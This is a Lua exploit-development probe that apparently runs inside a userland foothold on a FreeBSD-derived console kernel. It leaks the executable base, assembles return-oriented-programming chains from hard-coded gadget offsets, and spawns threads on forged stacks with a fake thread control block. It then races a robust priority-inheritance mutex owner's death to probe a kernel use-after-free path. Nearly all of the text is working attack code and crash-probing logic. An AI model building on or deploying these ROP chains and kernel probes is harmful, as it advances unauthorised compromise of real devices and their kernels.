-- CRASH_CLASS: MODERATE
-- PROBE 567a: a PI mutex with a waiter queued, and an owner that dies.
--
-- 564a showed flags 0x04 (UMUTEX_PRIO_INHERIT per FreeBSD 11 and the
-- bextr(flags,2,2) dispatch at 0x8ad44047) behaves like a normal mutex when
-- the owner exits uncontended: the word keeps the dead TID and trylock fails.
-- The PI object is only allocated under contention, so this probe queues a
-- second thread in op 5 behind the owner, then lets the owner exit. What
-- happens to the waiter answers whether the kernel's PI disown path runs on
-- 14.10, and that path is what walks the (dead) owner thread.

print("=== PROBE 567a: ROBUST OWNER EXIT ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_umtx = mk(454)
local sc_thr_new = mk(455)
local sc_nanosleep = mk(240)
local sc_thr_kill = mk(432)

local ts = memory.alloc(0x10)
local function nap_ms(ms)
    wq(N(ts), uint64(math.floor(ms / 1000)))
    wq(N(ts) + 8, uint64((ms % 1000) * 1000000))
    pcall(function() sc_nanosleep(uint64(N(ts)), uint64(0)) end)
end

local M = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(M) + i, 0) end
wd(N(M) + 4, 0x10)      -- UMUTEX_ROBUST

local function build(hold_ms, unlock_after)
    local CHAIN_MAX = 0x4000
    local stk = memory.alloc(0x8000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - 8
    local off = 0
    local own_ts = memory.alloc(0x10)
    wq(N(own_ts), uint64(math.floor(hold_ms / 1000)))
    wq(N(own_ts) + 8, uint64((hold_ms % 1000) * 1000000))
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
    emit(g_pop_rdi);   emit(uint64(N(M)))
    emit(g_pop_rsi);   emit(uint64(5))
    emit(g_pop_rdx);   emit(uint64(0))
    emit(g_pop_rax);   emit(uint64(454))
    emit(stub)
    emit(g_pop_rdi);   emit(uint64(N(own_ts)))
    emit(g_pop_rsi);   emit(uint64(0))
    emit(g_pop_rax);   emit(uint64(240))
    emit(stub)
    if unlock_after then
        emit(g_pop_rdi);   emit(uint64(N(M)))
        emit(g_pop_rsi);   emit(uint64(6))
        emit(g_pop_rdx);   emit(uint64(0))
        emit(g_pop_rax);   emit(uint64(454))
        emit(stub)
    end
    emit(g_pop_rdi);   emit(uint64(0))
    emit(g_pop_rax);   emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)
    return par, tid_ptr
end

local function kill0(tid)
    local ok, rv = pcall(function() return sc_thr_kill(uint64(tid), uint64(0)) end)
    if not ok then return -999 end
    return N(rv)
end

print("[B] robust owner locks, holds 250 ms, exits without unlocking")
local pa, ta = build(250, false)
local ok, rv = pcall(function() return sc_thr_new(pa, uint64(0x38)) end)
print(string.format("    thr_new ok=%s rv=%d", tostring(ok), N(rv)))
nap_ms(40)
print(string.format("    word=%08X owner_tid=%d kill0=%d", rd(N(M)) or 0, rd(N(ta)) or 0, kill0(rd(N(ta)) or 0)))

print("[C] waiter blocks in op 5 behind it, then unlocks and exits")
local pb, tb = build(0, true)
local ok2, rv2 = pcall(function() return sc_thr_new(pb, uint64(0x38)) end)
print(string.format("    thr_new ok=%s rv=%d", tostring(ok2), N(rv2)))
nap_ms(40)
print(string.format("    word=%08X waiter_tid=%d", rd(N(M)) or 0, rd(N(tb)) or 0))
if not alive() then print("DEAD after [C]"); return end

print("[D] owner exits at 250 ms; watch the waiter")
for i = 1, 6 do
    nap_ms(100)
    local w = rd(N(M)) or 0
    print(string.format("    t+%3dms word=%08X waiter_kill0=%d alive=%s", i * 100, w,
        kill0(rd(N(tb)) or 0), tostring(alive())))
    if not alive() then print("DEAD"); return end
end

print(string.format("[E] final word=%08X waiter_kill0=%d owner_kill0=%d",
    rd(N(M)) or 0, kill0(rd(N(tb)) or 0), kill0(rd(N(ta)) or 0)))

if (rd(N(M)) or 0) ~= 0 then
    print("[F] rescue: zero the word and wake")
    wd(N(M), 0)
    pcall(function() sc_umtx(uint64(N(M)), uint64(3), uint64(16), uint64(0), uint64(0)) end)
    nap_ms(100)
    print(string.format("    word=%08X waiter_kill0=%d alive=%s", rd(N(M)) or 0,
        kill0(rd(N(tb)) or 0), tostring(alive())))
end
print("=== DONE ===")
